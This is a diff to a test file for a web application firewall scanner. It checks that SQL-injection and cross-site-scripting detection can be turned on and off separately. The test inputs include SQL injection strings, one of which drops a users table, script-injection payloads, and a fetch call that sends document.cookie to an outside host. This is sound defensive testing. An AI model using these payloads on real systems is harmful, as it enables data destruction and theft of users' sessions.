@@ -7,7 +7,13 @@
  */
 
 import { describe, expect, it } from "vitest";
-import { injectionFailure } from "../src/waf-injection.js";
+import { injectionFailure as scanFor, type WafInjectionRequest } from "../src/waf-injection.js";
+
+/** Both classes armed, which is what every scope enforces until someone turns one off.
+ *  The cases below are about the signatures, so they all read the same way. */
+function injectionFailure(request: WafInjectionRequest): string | null {
+    return scanFor(request, { sql: true, xss: true });
+}
 
 /** A real browser's user agent, which is scanned on every request. */
 const CHROME =
@@ -161,5 +167,41 @@ describe("evasion", () => {
     it("leaves a malformed escape as it was sent rather than inventing a character", () => {
         // %2 is not an escape, so nothing here decodes into a quote.
         expect(injectionFailure({ query: "q=a%2zb%2" })).toBeNull();
+    });
+});
+
+describe("the two classes are separate controls", () => {
+    const SQL_ONLY = { sql: true, xss: false };
+    const XSS_ONLY = { sql: false, xss: true };
+
+    it("refuses only SQL when only SQL is armed", () => {
+        expect(scanFor({ query: "id=1' or 1=1--" }, SQL_ONLY)).toBe("sql always-true condition in the query");
+        expect(scanFor({ query: "id=1;drop table users" }, SQL_ONLY)).toBe("stacked sql statement in the query");
+        expect(scanFor({ query: "q=<script>alert(1)</script>" }, SQL_ONLY)).toBeNull();
+        expect(scanFor({ query: "next=javascript:alert(1)" }, SQL_ONLY)).toBeNull();
+        expect(scanFor({ query: "img=a.png\" onerror=alert(1)" }, SQL_ONLY)).toBeNull();
+    });
+
+    it("refuses only scripting when only scripting is armed", () => {
+        expect(scanFor({ query: "q=<script>alert(1)</script>" }, XSS_ONLY)).toBe("html <script> tag in the query");
+        expect(scanFor({ query: "q=';fetch('//e.co?c='+document.cookie);'" }, XSS_ONLY)).toBe(
+            "script object access in the query"
+        );
+        expect(scanFor({ query: "id=1' or 1=1--" }, XSS_ONLY)).toBeNull();
+        expect(scanFor({ query: "id=1 union select null,version()" }, XSS_ONLY)).toBeNull();
+    });
+
+    it("keeps scanning past a signature of the class that is off", () => {
+        // One value carrying both: the disabled class must not end the scan early, or
+        // switching one control off would quietly disable the other for that request.
+        expect(scanFor({ query: "id=1' or 1=1-- <script>" }, XSS_ONLY)).toBe("html <script> tag in the query");
+        expect(scanFor({ query: "q=<script>&id=1' or 1=1--" }, SQL_ONLY)).toBe(
+            "sql always-true condition in the query"
+        );
+    });
+
+    it("reads nothing at all when neither is armed", () => {
+        expect(scanFor({ query: "id=1' or 1=1--" }, { sql: false, xss: false })).toBeNull();
+        expect(scanFor({ query: "q=<script>alert(1)</script>" }, { sql: false, xss: false })).toBeNull();
     });
 });
